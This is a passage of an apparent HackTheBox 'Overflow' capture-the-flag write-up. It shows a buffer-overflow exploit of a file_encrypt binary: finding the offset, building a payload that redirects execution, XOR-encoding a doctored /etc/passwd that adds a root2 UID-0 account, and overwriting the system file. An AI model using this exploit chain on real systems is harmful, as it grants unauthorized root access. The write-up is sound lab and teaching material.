+name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements at developer@overflow.htb
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="hljs-number">0</span>x35624134 in ?? ()
+(gdb) </code></pre></div>
+<p>EIP was overwritten with 0x35624134.    Using <code class="inline-code">msf_pattern_offset</code> we can identify the overflow offset at 44.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ /usr/bin/msf-pattern_offset -l 300 -q 0x35624134   
+[*] Exact match at offset 44</pre><pre class="hljs"><code>$ /usr/bin/msf-pattern_offset -l <span class="hljs-number">300</span> -q <span class="hljs-number">0</span>x35624134   
+[*] <span class="hljs-built_in">Exact</span> <span class="hljs-built_in">match</span> at <span class="hljs-built_in">offset</span> <span class="hljs-number">44</span></code></pre></div>
+<p>Now that we know the offset, we're going to attempt to route the program execution to the <code class="inline-code">encrypt</code> function.  To get the address of the function, we run the program in <code class="inline-code">gdb</code>, issue a <code class="inline-code">ctrl-c</code> and dissassemble the function.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+This is the code 1804289383. Enter the Pin: -202976456
+name: ^C
+Program received signal SIGINT, Interrupt.
+0xf7fcf559 in __kernel_vsyscall ()
+(gdb) disas encrypt
+Dump of assembler code for function encrypt:
+   0x5655585b &lt;+0&gt;:     push   %ebp
+   0x5655585c &lt;+1&gt;:     mov    %esp,%ebp
+   0x5655585e &lt;+3&gt;:     push   %ebx
+   0x5655585f &lt;+4&gt;:     sub    $0x94,%esp
+   0x56555865 &lt;+10&gt;:    call   0x56555720 &lt;__x86.get_pc_thunk.bx&gt;
+   0x5655586a &lt;+15&gt;:    add    $0x2736,%ebx
+   0x56555870 &lt;+21&gt;:    movl   $0x0,-0x80(%ebp)
+   0x56555877 &lt;+28&gt;:    movl   $0x0,-0x7c(%ebp)
+   0x5655587e &lt;+35&gt;:    movl   $0x0,-0x78(%ebp)
+</pre><pre class="hljs"><code>(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+This is the code <span class="hljs-number">1804289383</span>. Enter the Pin: <span class="hljs-number">-202976456</span>
+<span class="hljs-symbol">name:</span> ^C
+Program received signal SIGINT<span class="hljs-punctuation">,</span> Interrupt.
+<span class="hljs-number">0xf7fcf559</span> in __kernel_vsyscall ()
+(gdb) disas encrypt
+Dump of assembler code for function encrypt:
+   <span class="hljs-number">0x5655585b</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   <span class="hljs-variable">%ebp</span>
+   <span class="hljs-number">0x5655585c</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    <span class="hljs-variable">%esp</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%ebp</span>
+   <span class="hljs-number">0x5655585e</span> &lt;+<span class="hljs-number">3</span>&gt;:     push   <span class="hljs-variable">%ebx</span>
+   <span class="hljs-number">0x5655585f</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">sub</span>    $<span class="hljs-number">0x94</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%esp</span>
+   <span class="hljs-number">0x56555865</span> &lt;+<span class="hljs-number">10</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x56555720</span> &lt;__x<span class="hljs-number">86</span>.get_pc_thunk.bx&gt;
+   <span class="hljs-number">0x5655586a</span> &lt;+<span class="hljs-number">15</span>&gt;:    <span class="hljs-keyword">add</span>    $<span class="hljs-number">0x2736</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%ebx</span>
+   <span class="hljs-number">0x56555870</span> &lt;+<span class="hljs-number">21</span>&gt;:    movl   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">80</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x56555877</span> &lt;+<span class="hljs-number">28</span>&gt;:    movl   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x5655587e</span> &lt;+<span class="hljs-number">35</span>&gt;:    movl   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">78</span>(<span class="hljs-variable">%ebp</span>)
+</code></pre></div>
+<p>The function starts at 0x5655585b</p>
+<p>Now we can add that to our buffer overflow to overwrite EIP and force us to the encrypt function.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python -c &quot;print('\x41' * 44 + '\x5b\x58\x55\x56')&quot;   
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV</pre><pre class="hljs"><code><span class="hljs-variable">python</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;print(&#x27;<span class="hljs-char escape_">\x41</span>&#x27; * 44 + &#x27;\x5b<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x55</span><span class="hljs-char escape_">\x56</span>&#x27;)&quot;</span>   
+<span class="hljs-variable">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>[<span class="hljs-variable">XUV</span></code></pre></div>
+<p>And we were successfull.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+This is the code 1804289383. Enter the Pin: -202976456
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
+Enter Input File: </pre><pre class="hljs"><code>(gdb) r
+Starting program: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Targets/</span>overflow<span class="hljs-regexp">/loot/</span>file_encrypt 
+<span class="hljs-keyword">This</span> is the code <span class="hljs-number">1804289383</span>. Enter the Pin: -<span class="hljs-number">202976456</span>
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements at developer@overflow.htb
+Enter Input <span class="hljs-keyword">File</span>: </code></pre></div>
+<p>Going back into Ghidra, we take a closer look at the <code class="inline-code">encrypt</code> function.  The program's purpose is to take a file and encrypt it in a new location.  It does this by reading the file and XOR'ing it with <code class="inline-code">0x9b</code>.  Our plan is to create a copy of /etc/passwd and add a new root user.  We'll then use the program to encrypt and overwrite the system /etc/passwd with our modified copy.</p>
+<p>You may be thinking... if the new /etc/passwd file is encrypted, how will it be valid?  The answer is that we will manually encrypt our modified passwd file first prior to passing it through the program.  An encrypted value XOR'ed by the same key (0x9b) should give us the original cleartext /etc/passwd.  In other words, the encryption program will actually decrypt our passwd file when it overwrites /etc/passwd.</p>
+<p>ok, let's put it all together.</p>
+<p>I'm using a root2:testing username and password which I've previously generated and appending it to the /tmp/passwd file.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:~$ cp /etc/passwd /tmp/passwd
+
+tester@overflow:~$ echo root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash &gt;&gt; /tmp/passwd
+
+tester@overflow:~$ cat /tmp/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+tester:x:1000:1000:tester,,,:/home/tester:/bin/bash
+postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
+developer:x:1001:1001::/home/developer:/bin/sh
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
+tester@overflow:~$ </pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp /etc/passwd /tmp/passwd
+
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-symbol">root2:</span><span class="hljs-symbol">KWi2XW05LmkMg:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> &gt;&gt; <span class="hljs-regexp">/tmp/passwd</span>
+
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /tmp/passwd
+<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
+<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/lxd/</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">landscape:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/landscape</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">tester:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:tester</span>,,,<span class="hljs-symbol">:/home/tester</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">116</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">developer:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/developer</span><span class="hljs-symbol">:/bin/sh</span>
+<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">root2:</span><span class="hljs-symbol">KWi2XW05LmkMg:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span></code></pre></div>
+<p>Next we encrypt our modified /tmp/passwd file.  To do this, I wrote a simple python script.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">#!/usr/bin/python3
+
+source = open('/tmp/passwd', 'rb').read()
+dest = open('/tmp/passwd2', 'wb')
+
+for i in source:
+    dest.write(bytes([i ^ 0x9b]))</pre><pre class="hljs"><code>#!/usr/bin/<span class="hljs-keyword">python3</span>
+
+<span class="hljs-keyword">source</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/tmp/passwd&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-keyword">read</span>()
+dest = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/tmp/passwd2&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)
+
+<span class="hljs-keyword">for</span> i in <span class="hljs-keyword">source</span>:
+    dest.<span class="hljs-keyword">write</span>(bytes([i ^ <span class="hljs-number">0</span>x9b]))</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/tmp$ python3 encrypt.py
+tester@overflow:/tmp$ head /tmp/passwd2
+�����㡫�������������������������㡪������������������������������������������㡩����������������������������������㡨�����衴���������������������������㡯���������������������������������㡮��������衴��������衴���������������������㡭��������������������������������������������㡬����롴�������������������������������������㡣�����������������������������������������㡢������衴�������������衴����������������������㡪��������롴�������������롴�����������������������㡪���������⡴�������������������������������㡨���������������������존������������������������㡨����������롴����������衴����������������������㡨������������������������顴����������������������������㡨������������������������������������������������㡯�����������������������������������������������������衴������������������������㡭����������������⡴�������������������������������������������㡪��������������������������������ﷷ�������������������������������������������������������㡪����������������������鷷������������������������������������������������㡪��������������������������������������������������㡪�����������������������������������������㡪������������������������������������������㡪
+tester@overflow:/tmp$ </pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>python3 encrypt.py
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>head /tmp/passwd2
+�����㡫�������������������������㡪������������������������������������������㡩����������������������������������㡨�����衴���������������������������㡯���������������������������������㡮��������衴��������衴���������������������㡭��������������������������������������������㡬����롴�������������������������������������㡣�����������������������������������������㡢������衴�������������衴����������������������㡪��������롴�������������롴�����������������������㡪���������⡴�������������������������������㡨���������������������존������������������������㡨����������롴����������衴����������������������㡨������������������������顴����������������������������㡨������������������������������������������������㡯�����������������������������������������������������衴������������������������㡭����������������⡴�������������������������������������������㡪��������������������������������ﷷ�������������������������������������������������������㡪����������������������鷷������������������������������������������������㡪��������������������������������������������������㡪�����������������������������������������㡪������������������������������������������㡪
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span></code></pre></div>
+<p>Now w'e're ready to run the file_encrypt program with our overflow.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/opt/file_encrypt$ ./file_encrypt
+This is the code 1804289383. Enter the Pin: -202976456
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
+Enter Input File: /tmp/passwd2
+Enter Encrypted File: /etc/passwd
+Segmentation fault (core dumped)
+tester@overflow:/opt/file_encrypt$ 
+</pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>./file_encrypt
+This is the code <span class="hljs-number">1804289383</span>. Enter the <span class="hljs-symbol">Pin:</span> <span class="hljs-number">-202976456</span>
+<span class="hljs-symbol">name:</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements at developer<span class="hljs-variable">@overflow</span>.htb
+Enter Input <span class="hljs-symbol">File:</span> /tmp/passwd2
+Enter Encrypted <span class="hljs-symbol">File:</span> /etc/passwd
+Segmentation fault (core dumped)
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>
+</code></pre></div>
+<p>Our program crashed, but if we check the /etc/passwd file, we see that we successfully overwrote the original file with our modified version.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/opt/file_encrypt$ tail /etc/passwd
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+tester:x:1000:1000:tester,,,:/home/tester:/bin/bash
+postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
+developer:x:1001:1001::/home/developer:/bin/sh
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
+tester@overflow:/opt/file_encrypt$ </pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>tail /etc/passwd
+<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">landscape:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/landscape</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">tester:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:tester</span>,,,<span class="hljs-symbol">:/home/tester</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">116</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+<span class="hljs-symbol">developer:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/developer</span><span class="hljs-symbol">:/bin/sh</span>
+<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">root2:</span><span class="hljs-symbol">KWi2XW05LmkMg:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
